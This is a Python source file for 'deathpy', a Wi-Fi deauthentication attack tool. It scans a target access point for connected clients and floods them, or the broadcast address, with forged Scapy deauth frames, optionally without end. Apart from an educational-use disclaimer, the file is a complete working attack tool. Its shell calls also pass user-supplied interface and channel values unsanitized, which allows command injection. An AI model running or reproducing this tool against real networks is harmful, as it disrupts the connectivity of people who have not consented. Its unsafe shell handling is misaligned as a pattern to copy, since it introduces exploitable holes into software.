#!/usr/bin/python3
#
#--------------------------------------------------------------------------------------------------------------------------
# Author: Rofi (Fixploit03)
# GitHub: https://github.com/fixploit03/deathpy
# Copyright (c) 2025 - Rofi (Fixploit03)
#--------------------------------------------------------------------------------------------------------------------------
# DISCLAIMER:
#
# This program is created solely for educational and learning purposes about wireless network security (Wi-Fi).
# Usage of this program should only be conducted on networks or devices that you own or have explicit permission
# from the owner to test their security. Using this program for illegal purposes, such as disrupting, infiltrating,
# or damaging networks without permission, is unlawful in many jurisdictions and may result in serious legal consequences,
# including fines or imprisonment.
#
# The creator (Rofi/Fixploit03) is not responsible for any misuse or damage caused by the use of this program.
# You, as the user, are fully responsible for your own actions and must comply with the laws and regulations applicable
# in your region.
#
# This program is designed to help understand how deauthentication attacks work in a controlled and legal environment,
# such as a cybersecurity lab or authorized penetration testing. We strongly recommend that you study hacking ethics
# and relevant laws BEFORE using this program. Do not use this program for malicious purposes or without proper authorization
# from the relevant parties.
#
# By using this program, you acknowledge that you understand the risks, responsibilities, and legal limitations,
# and agree to use it only in a lawful and ethical context for educational or authorized security testing purposes.
#--------------------------------------------------------------------------------------------------------------------------

# --- Import Section: Modules required for the program ---
import sys          # For system operations like exiting and platform checking
import time         # For timing and delay operations
import re           # For validating MAC address format with regex
import os           # For interacting with the operating system (e.g., checking interfaces)
import signal       # For handling signals like CTRL+C
import argparse     # For parsing command-line arguments
import platform     # For detailed operating system checking
from scapy.all import *  # For network packet manipulation and sending
from termcolor import colored  # For colored terminal output

# --- Global Variable Section: Defines a flag to control the attack ---
stop_attack = False  # Global flag to stop the attack when CTRL+C is pressed

# --- Function Section: Signal handler for graceful termination ---
def signal_handler(sig, frame):
    """
    Handle CTRL+C signal to stop the deauthentication attack gracefully.

    Args:
        sig (int): Signal number received (e.g., SIGINT for CTRL+C).
        frame (frame): Current stack frame (not used here).

    Returns:
        None: Exits the program with status code 0.
    """
    global stop_attack
    time_str = colored(get_current_time(), 'cyan')
    print(colored(f"[{time_str}] ", 'white') + colored("[", 'white') + colored("INFO", 'green', attrs=['bold']) + colored("] ", 'white') + colored("CTRL+C detected. Stopping deauthentication attack...", 'white'))
    stop_attack = True
    sys.exit(0)

# --- Function Section: Get current time for logging ---
def get_current_time():
    """
    Return the current time in HH:MM:SS format for logging purposes.

    Returns:
        str: Current time formatted as HH:MM:SS.
    """
    return time.strftime("%H:%M:%S")

# --- Function Section: Validate MAC address format ---
def validate_mac(mac):
    """
    Validate the format of a MAC address (e.g., 00:11:22:33:44:55 or 00-11-22-33-44-55).

    Args:
        mac (str): The MAC address to validate.

    Returns:
        str: The validated MAC address if correct.

    Raises:
        ValueError: If the MAC address format is invalid.
    """
    if not re.match(r'^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$', mac):
        raise ValueError(f"Invalid MAC address format: {mac}")
    return mac

# --- Function Section: Check for root privileges ---
def check_root():
    """
    Check if the program is running with root privileges, required for network operations.

    Returns:
        None: Exits with status code 1 if not root.

    Raises:
        None: Prints an error message and exits if not running as root.
    """
    if os.geteuid() != 0:
        time_str = colored(get_current_time(), 'cyan')
        print(colored(f"[{time_str}] ", 'white') + colored("[", 'white') + colored("ERROR", 'red', attrs=['bold']) + colored("] ", 'white') + colored("Please run the program as root!", 'white'))
        sys.exit(1)

# --- Function Section: Verify network interface existence ---
def check_interface_exists(interface):
    """
    Check if the specified network interface exists in the system.

    Args:
        interface (str): The network interface name (e.g., wlan0).

    Returns:
        None: Exits with status code 1 if the interface does not exist.

    Raises:
        None: Prints an error message and exits if the interface is not found.
    """
    interfaces = os.listdir("/sys/class/net/")
    if interface not in interfaces:
        time_str = colored(get_current_time(), 'cyan')
        print(colored(f"[{time_str}] ", 'white') + colored("[", 'white') + colored("ERROR", 'red', attrs=['bold']) + colored("] ", 'white') + colored(f"Interface {interface} not found!", 'white'))
        sys.exit(1)

# --- Function Section: Verify monitor mode for the interface ---
def check_interface_mode(interface):
    """
    Check if the network interface is in monitor mode, required for packet injection.

    Args:
        interface (str): The network interface name (e.g., wlan0).

    Returns:
        None: Exits with status code 1 if not in monitor mode or if an error occurs.

    Raises:
        Exception: Prints an error message and exits if mode check fails.
    """
    try:
        result = os.popen(f"iwconfig {interface}").read()
        if "Mode:Monitor" not in result:
            time_str = colored(get_current_time(), 'cyan')
            print(colored(f"[{time_str}] ", 'white') + colored("[", 'white') + colored("ERROR", 'red', attrs=['bold']) + colored("] ", 'white') + colored("Interface is not in monitor mode!", 'white'))
            sys.exit(1)
    except Exception as e:
        time_str = colored(get_current_time(), 'cyan')
        print(colored(f"[{time_str}] ", 'white') + colored("[", 'white') + colored("ERROR", 'red', attrs=['bold']) + colored("] ", 'white') + colored(f"Error checking interface mode: {e}", 'white'))
        sys.exit(1)

# --- Function Section: Create a deauthentication packet ---
def create_deauth_packet(bssid, client):
    """
    Create a deauthentication packet using Scapy for the specified BSSID and client.

    Args:
        bssid (str): The BSSID (MAC address) of the target access point.
        client (str): The MAC address of the client to deauthenticate.

    Returns:
        scapy.packet.Packet: The constructed deauthentication packet.
    """
    pkt = RadioTap() / Dot11(addr1=client, addr2=bssid, addr3=bssid) / Dot11Deauth(reason=7)
    return pkt

# --- Function Section: Scan for clients connected to an AP ---
def scan_clients(interface, bssid, channel, timeout=30, verbose=False):
    """
    Scan for all clients connected to the specified AP, ensuring no duplicate MACs.

    Args:
        interface (str): The network interface in monitor mode (e.g., wlan0).
        bssid (str): The BSSID of the target access point.
        channel (int): The channel to scan on.
        timeout (int, optional): Duration of the scan in seconds (default: 30).
        verbose (bool, optional): If True, show each found client during scanning (default: False).

    Returns:
        list: A list of unique client MAC addresses found.

    Raises:
        Exception: Exits if setting the channel fails.
    """
    clients = set()
    try:
        os.system(f"iwconfig {interface} channel {channel}")
    except Exception as e:
        time_str = colored(get_current_time(), 'cyan')
        print(colored(f"[{time_str}] ", 'white') + colored("[", 'white') + colored("ERROR", 'red', attrs=['bold']) + colored("] ", 'white') + colored(f"Error setting channel: {e}", 'white'))
        sys.exit(1)
    
    def packet_handler(pkt):
        """Callback function to process each captured packet"""
        if pkt.haslayer(Dot11) and pkt.addr2 == bssid and pkt.addr1 != "ff:ff:ff:ff:ff:ff":
            client_mac = pkt.addr1
            if client_mac not in clients:
                clients.add(client_mac)
                if verbose:
                    time_str = colored(get_current_time(), 'cyan')
                    print(colored(f"[{time_str}] ", 'white') + colored("[", 'white') + colored("INFO", 'green', attrs=['bold']) + colored("] ", 'white') + colored(f"Found client: {client_mac}", 'white'))
    
    time_str = colored(get_current_time(), 'cyan')
    print(colored(f"[{time_str}] ", 'white') + colored("[", 'white') + colored("INFO", 'green', attrs=['bold']) + colored("] ", 'white') + colored(f"Scanning for clients for {timeout} seconds...", 'white'))
    sniff(iface=interface, prn=packet_handler, timeout=timeout)
    return list(clients)

# --- Function Section: Send deauthentication packets ---
def send_deauth_packets(interface, bssid, clients, count, channel, interval=0, is_manual_client=False, verbose=False):
    """
    Send deauthentication packets to detected or specified clients, adjusting message based on client count and verbose mode.

    Args:
        interface (str): The network interface in monitor mode (e.g., wlan0).
        bssid (str): The BSSID of the target access point.
        clients (list): List of client MAC addresses to target.
        count (int): Number of packets to send per client (0 for continuous mode).
        channel (int): The channel to operate on.
        interval (float, optional): Delay between packets in seconds (default: 0).
        is_manual_client (bool, optional): True if client is manually specified via -a (default: False).
        verbose (bool, optional): If True, show detailed packet information (default: False).

    Returns:
        None: Executes the attack and logs progress.

    Raises:
        PermissionError: Exits if permission is denied.
        Exception: Exits if an unexpected error occurs during the attack.
    """
    try:
        if not clients:
            time_str = colored(get_current_time(), 'cyan')
            print(colored(f"[{time_str}] ", 'white') + colored("[", 'white') + colored("INFO", 'green', attrs=['bold']) + colored("] ", 'white') + colored("No clients found, switching to broadcast mode.", 'white'))
            clients = ["ff:ff:ff:ff:ff:ff"]
        elif is_manual_client:
            time_str = colored(get_current_time(), 'cyan')
            print(colored(f"[{time_str}] ", 'white') + colored("[", 'white') + colored("INFO", 'green', attrs=['bold']) + colored("] ", 'white') + colored(f"Targeting specified client: {clients}", 'white'))
        else:
            time_str = colored(get_current_time(), 'cyan')
            print(colored(f"[{time_str}] ", 'white') + colored("[", 'white') + colored("INFO", 'green', attrs=['bold']) + colored("] ", 'white') + colored(f"Found {len(clients)} clients: {clients}", 'white'))

        bssid = validate_mac(bssid)
        os.system(f"iwconfig {interface} channel {channel}")

        packet_sent_logged = False

        if count == 0:
            time_str = colored(get_current_time(), 'cyan')
            if len(clients) == 1 and is_manual_client:
                print(colored(f"[{time_str}] ", 'white') + colored("[", 'white') + colored("INFO", 'green', attrs=['bold']) + colored("] ", 'white') + colored(f"Starting deauthentication attack with continuous packets (interval: {interval}s)...", 'white'))
            else:
                print(colored(f"[{time_str}] ", 'white') + colored("[", 'white') + colored("INFO", 'green', attrs=['bold']) + colored("] ", 'white') + colored(f"Starting deauthentication attack with continuous packets per client (interval: {interval}s)...", 'white'))
            packet_number = 1
            while not stop_attack:
                for client_mac in clients:
                    packet = create_deauth_packet(bssid, client_mac)
                    sendp(packet, iface=interface, verbose=0)
                    time_str = colored(get_current_time(), 'cyan')
                    if verbose:
                        if client_mac != "ff:ff:ff:ff:ff:ff":
                            print(colored(f"[{time_str}] ", 'white') + colored("[", 'white') + colored("INFO", 'green', attrs=['bold']) + colored("] ", 'white') + colored(f"Sending packet {packet_number} to {bssid} (CLIENT: {client_mac})", 'white'))
                        else:
                            print(colored(f"[{time_str}] ", 'white') + colored("[", 'white') + colored("INFO", 'green', attrs=['bold']) + colored("] ", 'white') + colored(f"Sending packet {packet_number} to {bssid} (broadcast mode)", 'white'))
                    elif not packet_sent_logged:
                        print(colored(f"[{time_str}] ", 'white') + colored("[", 'white') + colored("INFO", 'green', attrs=['bold']) + colored("] ", 'white') + colored(f"Sending packet to {bssid}", 'white'))
                        packet_sent_logged = True
                    packet_number += 1
                    time.sleep(interval)
        else:
            total_packets = count * len(clients)
            time_str = colored(get_current_time(), 'cyan')
            if len(clients) == 1 and is_manual_client:
                print(colored(f"[{time_str}] ", 'white') + colored("[", 'white') + colored("INFO", 'green', attrs=['bold']) + colored("] ", 'white') + colored(f"Starting deauthentication attack with {count} packets (interval: {interval}s)...", 'white'))
            else:
                print(colored(f"[{time_str}] ", 'white') + colored("[", 'white') + colored("INFO", 'green', attrs=['bold']) + colored("] ", 'white') + colored(f"Starting deauthentication attack with {count} packets per client (total: {total_packets}, interval: {interval}s)...", 'white'))
            packet_number = 1
            for client_mac in clients:
                if stop_attack:
                    break
                for i in range(count):
                    if stop_attack:
                        break
                    packet = create_deauth_packet(bssid, client_mac)
                    sendp(packet, iface=interface, verbose=0)
                    time_str = colored(get_current_time(), 'cyan')
                    if verbose:
                        if client_mac != "ff:ff:ff:ff:ff:ff":
                            print(colored(f"[{time_str}] ", 'white') + colored("[", 'white') + colored("INFO", 'green', attrs=['bold']) + colored("] ", 'white') + colored(f"Sending packet {packet_number}/{total_packets} to {bssid} (CLIENT: {client_mac})", 'white'))
                        else:
                            print(colored(f"[{time_str}] ", 'white') + colored("[", 'white') + colored("INFO", 'green', attrs=['bold']) + colored("] ", 'white') + colored(f"Sending packet {packet_number}/{total_packets} to {bssid} (broadcast mode)", 'white'))
                    elif not packet_sent_logged:
                        print(colored(f"[{time_str}] ", 'white') + colored("[", 'white') + colored("INFO", 'green', attrs=['bold']) + colored("] ", 'white') + colored(f"Sending packet to {bssid}", 'white'))
                        packet_sent_logged = True
                    packet_number += 1
                    time.sleep(interval)

        time_str = colored(get_current_time(), 'cyan')
        print(colored(f"[{time_str}] ", 'white') + colored("[", 'white') + colored("INFO", 'green', attrs=['bold']) + colored("] ", 'white') + colored("Deauthentication attack completed.", 'white'))

    except PermissionError:
        time_str = colored(get_current_time(), 'cyan')
        print(colored(f"[{time_str}] ", 'white') + colored("[", 'white') + colored("ERROR", 'red', attrs=['bold']) + colored("] ", 'white') + colored("Permission denied: Please ensure you have the necessary privileges!", 'white'))
        sys.exit(1)
    except Exception as e:
        time_str = colored(get_current_time(), 'cyan')
        print(colored(f"[{time_str}] ", 'white') + colored("[", 'white') + colored("ERROR", 'red', attrs=['bold']) + colored("] ", 'white') + colored(f"Error during deauthentication attack: {e}", 'white'))
        sys.exit(1)

# --- Main Function Section: Coordinate program execution ---
def main():
    """
    Main function to coordinate program execution, parse arguments, and initiate the attack.

    Returns:
        None: Executes the program and handles errors.

    Raises:
        ValueError: Exits if argument validation fails (e.g., invalid MAC).
        Exception: Exits if an unexpected error occurs during execution or if not on Linux.
    """
    os_name = platform.system()
    if os_name != "Linux":
        time_str = colored(get_current_time(), 'cyan')
        print(colored(f"[{time_str}] ", 'white') + colored("[", 'white') + colored("ERROR", 'red', attrs=['bold']) + colored("] ", 'white') + colored(f"This program is only supported on Linux! Detected OS: {os_name}", 'white'))
        sys.exit(1)

    signal.signal(signal.SIGINT, signal_handler)
    check_root()

    description = (
        "WiFi Deauthentication Attack Program\n"
        "Author: Rofi (Fixploit03)\n"
        "GitHub: https://github.com/fixploit03/deauther\n"
        "Copyright (c) 2025 Rofi (Fixploit03). All rights reserved."
    )

    parser = argparse.ArgumentParser(
        description=description,
        formatter_class=argparse.RawTextHelpFormatter
    )
    
    parser.add_argument("interface", help="Network interface in monitor mode (e.g., wlan0)")
    parser.add_argument("-b", "--bssid", required=True, help="BSSID of the target AP (e.g., 00:11:22:33:44:55)")
    parser.add_argument("-c", "--channel", type=int, required=True, help="Channel of the target AP (e.g., 6)")
    parser.add_argument("-a", "--client", help="Client MAC to deauth (e.g., 66:77:88:99:AA:BB). If not specified, scans for clients and deauths all found clients.")
    parser.add_argument("-n", "--count", type=int, default=0, help="Number of packets to send per client. Use 0 for continuous mode (default: 0)")
    parser.add_argument("-t", "--timeout", type=int, default=30, help="Client scan timeout in seconds (default: 30)")
    parser.add_argument("-i", "--interval", type=float, default=0, help="Interval between packet sends in seconds (e.g., 0.1, default: 0)")
    parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose output")

    args = parser.parse_args()

    check_interface_exists(args.interface)
    check_interface_mode(args.interface)

    try:
        if args.client is None:
            clients = scan_clients(args.interface, args.bssid, args.channel, args.timeout, verbose=args.verbose)
            send_deauth_packets(args.interface, args.bssid, clients, args.count, args.channel, args.interval, is_manual_client=False, verbose=args.verbose)
        else:
            clients = [validate_mac(args.client)]
            send_deauth_packets(args.interface, args.bssid, clients, args.count, args.channel, args.interval, is_manual_client=True, verbose=args.verbose)

    except ValueError as ve:
        time_str = colored(get_current_time(), 'cyan')
        print(colored(f"[{time_str}] ", 'white') + colored("[", 'white') + colored("ERROR", 'red', attrs=['bold']) + colored("] ", 'white') + colored(f"Error: {ve}", 'white'))
        sys.exit(1)
    except Exception as e:
        time_str = colored(get_current_time(), 'cyan')
        print(colored(f"[{time_str}] ", 'white') + colored("[", 'white') + colored("ERROR", 'red', attrs=['bold']) + colored("] ", 'white') + colored(f"Critical error: {e}", 'white'))
        sys.exit(1)

# --- Execution Entry Point ---
if __name__ == "__main__":
    main()
